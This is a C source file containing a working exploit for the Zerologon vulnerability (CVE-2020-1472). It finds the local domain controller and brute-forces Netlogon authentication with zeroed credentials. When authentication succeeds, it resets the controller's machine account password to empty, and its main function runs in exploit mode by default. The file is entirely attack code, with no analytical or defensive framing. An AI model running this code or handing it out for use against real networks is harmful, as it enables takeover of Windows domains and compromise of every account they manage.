#include <windows.h>
#include <stdio.h>
#include <dsgetdc.h>
#include <lm.h>
#include <Ntsecapi.h>

#pragma comment(lib, "Netapi32.lib")

typedef struct _NETLOGON_CREDENTIAL {
	CHAR data[8];
} NETLOGON_CREDENTIAL, * PNETLOGON_CREDENTIAL;

typedef struct _NETLOGON_AUTHENTICATOR {
	NETLOGON_CREDENTIAL Credential;
	DWORD Timestamp;
} NETLOGON_AUTHENTICATOR, * PNETLOGON_AUTHENTICATOR;

typedef  enum _NETLOGON_SECURE_CHANNEL_TYPE {
	NullSecureChannel = 0,
	MsvApSecureChannel = 1,
	WorkstationSecureChannel = 2,
	TrustedDnsDomainSecureChannel = 3,
	TrustedDomainSecureChannel = 4,
	UasServerSecureChannel = 5,
	ServerSecureChannel = 6,
	CdcServerSecureChannel = 7
} NETLOGON_SECURE_CHANNEL_TYPE;

typedef struct _NL_TRUST_PASSWORD {
	WCHAR Buffer[256];
	ULONG Length;
} NL_TRUST_PASSWORD, * PNL_TRUST_PASSWORD;

typedef NTSTATUS(WINAPI* _I_NetServerReqChallenge)(LPWSTR, LPWSTR, PNETLOGON_CREDENTIAL, PNETLOGON_CREDENTIAL);
typedef NTSTATUS(WINAPI* _I_NetServerAuthenticate2)(LPWSTR PrimaryName, LPWSTR AccountName, NETLOGON_SECURE_CHANNEL_TYPE AccountType, LPWSTR ComputerName, PNETLOGON_CREDENTIAL ClientCredential, PNETLOGON_CREDENTIAL ServerCredential, PULONG NegotiatedFlags);
typedef NTSTATUS(WINAPI* _I_NetServerPasswordSet2)(LPWSTR PrimaryName, LPWSTR AccountName, NETLOGON_SECURE_CHANNEL_TYPE AccountType, LPWSTR ComputerName, PNETLOGON_AUTHENTICATOR Authenticator, PNETLOGON_AUTHENTICATOR ReturnAuthenticator, PNL_TRUST_PASSWORD ClearNewPassword);

BOOL RunExploitZeroLogon(wchar_t* dc_fqdn, wchar_t* dc_netbios, wchar_t* dc_account, BOOL isExploit) {
	NETLOGON_CREDENTIAL    ClientCh = { 0 };
	NETLOGON_CREDENTIAL    ServerCh = { 0 };
	NETLOGON_AUTHENTICATOR Auth = { 0 };
	NETLOGON_AUTHENTICATOR AuthRet = { 0 };
	NL_TRUST_PASSWORD      NewPass = { 0 };
	ULONG                  NegotiateFlags = 0x212fffff;
	UINT				   maxTry = 2000;

	//HMODULE hDbghelp = GetModuleHandleA("Dbghelp.dll");
	HMODULE netapi32 = LoadLibraryA("netapi32.dll");
	if (netapi32 == NULL) {
		printf("[x] Fail netapi32 == NULL !\n");
		return FALSE;
	}
	_I_NetServerReqChallenge I_NetServerReqChallenge = (_I_NetServerReqChallenge)GetProcAddress(netapi32, "I_NetServerReqChallenge");
	_I_NetServerAuthenticate2 I_NetServerAuthenticate2 = (_I_NetServerAuthenticate2)GetProcAddress(netapi32, "I_NetServerAuthenticate2");
	_I_NetServerPasswordSet2 I_NetServerPasswordSet2 = (_I_NetServerPasswordSet2)GetProcAddress(netapi32, "I_NetServerPasswordSet2");
	if (I_NetServerReqChallenge == NULL || I_NetServerAuthenticate2 == NULL || I_NetServerPasswordSet2  == NULL ) {
		printf("[x] Fail to GetProcAddress of netapi32 function !\n");
		return FALSE;
	}
	for (UINT i = 0; i < maxTry; i++) {
		/*if (I_NetServerReqChallenge(dc_fqdn, dc_netbios, &ClientCh, &ServerCh) == 0) {
			//printf("[x] Unable to complete server challenge. Possible invalid name or network issues?\n");
		}*/
		I_NetServerReqChallenge(dc_fqdn, dc_netbios, &ClientCh, &ServerCh);
		if ((I_NetServerAuthenticate2(dc_fqdn, dc_account, ServerSecureChannel, dc_netbios, &ClientCh, &ServerCh, &NegotiateFlags) == 0)) {
			printf("[*] %S is vurlnerable to Zerologon\n", dc_account);

			if (isExploit) {
				if (I_NetServerPasswordSet2(dc_fqdn, dc_account, ServerSecureChannel, dc_netbios, &Auth, &AuthRet, &NewPass) != 0) {
					printf("[x] Failed to set machine account pass for %S\n", dc_account);
					return FALSE;
				} else {
					printf("[*] Exploit successfully %ws !\n", dc_account);
					printf("[*] Server hash: 31d6cfe0d16ae931b73c59d7e0c089c0\n");
				}
			}
			return TRUE;
		}
		printf("[i] Try: %i/%i\r",i+1, maxTry);
	}
	printf("\n[x] %ws is not vulnerable\n", dc_fqdn);
	return FALSE;
}

BOOL GetDcName(char* dc_fqdn, wchar_t** wdc_fqdn, wchar_t** wdc_netbios, wchar_t** wdc_account) {
	char* next_token = NULL;
	char* ptr;

	*wdc_fqdn = (wchar_t*)calloc(MAX_PATH, 2);
	if (*wdc_fqdn == NULL)
		return FALSE;
	*wdc_netbios = (wchar_t*)calloc(MAX_PATH, 2);
	if (*wdc_netbios == NULL) {
		free(*wdc_fqdn);
		return FALSE;
	}
	*wdc_account = (wchar_t*)calloc(MAX_PATH, 2);
	if (*wdc_account == NULL) {
		free(*wdc_netbios);
		free(*wdc_fqdn);
		return FALSE;
	}

	swprintf(*wdc_fqdn, MAX_PATH, L"%hs", dc_fqdn);

	ptr = strtok_s(dc_fqdn, ".",&next_token);
	if (ptr != NULL) {
		swprintf_s(*wdc_netbios, MAX_PATH, L"%hs", ptr);
		swprintf_s(*wdc_account, MAX_PATH, L"%s$", *wdc_netbios);
		return TRUE;
	}
	free(*wdc_account);
	free(*wdc_netbios);
	free(*wdc_fqdn);
	return FALSE;
}

// https://stackoverflow.com/questions/48542321/get-domain-controller-name
BOOL GetDnsDomainName(char* dcDqDn, int bufferSize) {
	LSA_HANDLE PolicyHandle;
	static LSA_OBJECT_ATTRIBUTES oa = { sizeof(oa) };
	NTSTATUS status = LsaOpenPolicy(0, &oa, POLICY_VIEW_LOCAL_INFORMATION, &PolicyHandle);

	if (LSA_SUCCESS(status)) {
		PPOLICY_DNS_DOMAIN_INFO ppddi;

		if (LSA_SUCCESS(status = LsaQueryInformationPolicy(PolicyHandle, PolicyDnsDomainInformation, (void**)&ppddi))) {
			if (ppddi->Sid) {
				sprintf_s(dcDqDn, bufferSize, "%wZ", &ppddi->DnsDomainName);
				LsaFreeMemory(ppddi);
				LsaClose(PolicyHandle);
				return TRUE;
			}
			LsaFreeMemory(ppddi);
		}

		LsaClose(PolicyHandle);
	}
	return FALSE;
}
BOOL GetDcFqdn(char* dcDqDn, int dcDqDnSize) {
	char* dnsDomainName = (char*)malloc(MAX_PATH);
	if (dnsDomainName != NULL) {
		if (GetDnsDomainName(dnsDomainName, MAX_PATH)) {
			DOMAIN_CONTROLLER_INFOA* DomainControllerInfo = (DOMAIN_CONTROLLER_INFOA*)malloc(sizeof(DOMAIN_CONTROLLER_INFOA));
			ULONG Flags = DS_DIRECTORY_SERVICE_REQUIRED | DS_GC_SERVER_REQUIRED | DS_IS_DNS_NAME | DS_RETURN_DNS_NAME;
			//printf("DnsDomainName: %s\n", dnsDomainName);
			if (DsGetDcNameA(NULL, dnsDomainName, 0, NULL, Flags, (PDOMAIN_CONTROLLER_INFOA*)&DomainControllerInfo) == ERROR_SUCCESS) {
				//printf("DomainControllerName: %s\n", DomainControllerInfo->DomainControllerName);
				//printf("DomainControllerAddress: %s\n", DomainControllerInfo->DomainControllerAddress);
				strcpy_s(dcDqDn, dcDqDnSize, DomainControllerInfo->DomainControllerName + 2);  // the +2 to remove the '\\'
				NetApiBufferFree((LPVOID)DomainControllerInfo);
				free(dnsDomainName);
				return TRUE;
			}
		}
		free(dnsDomainName);
	}
	return FALSE;
}

BOOL ExploitZeroLogon(BOOL isExploit) {
	printf("[-] Zerologon - CVE-2020-1472 exploit\n\n");

	char* dcFqdn = (char*)malloc(MAX_PATH);
	if (dcFqdn != NULL) {
		if (GetDcFqdn(dcFqdn, MAX_PATH)) {
			wchar_t* wdc_fqdn;
			wchar_t* wdc_netbios;
			wchar_t* wdc_account;

			printf("[i] Domain Controller fqdn: %s\n", dcFqdn);
			if (GetDcName(dcFqdn, &wdc_fqdn, &wdc_netbios, &wdc_account)) {
				printf("[v] Domain Controller netbios: %ws\n", wdc_netbios);
				printf("[v] Domain Controller account: %ws\n", wdc_account);
				BOOL retVal = RunExploitZeroLogon(wdc_fqdn, wdc_netbios, wdc_account, isExploit);
				free(wdc_account);
				free(wdc_netbios);
				free(wdc_fqdn);
				free(dcFqdn);
				return retVal;
			}
			free(dcFqdn);
		}
	}
	return FALSE;
}




int main() {
	ExploitZeroLogon(TRUE);
	system("pause");
	return FALSE;
}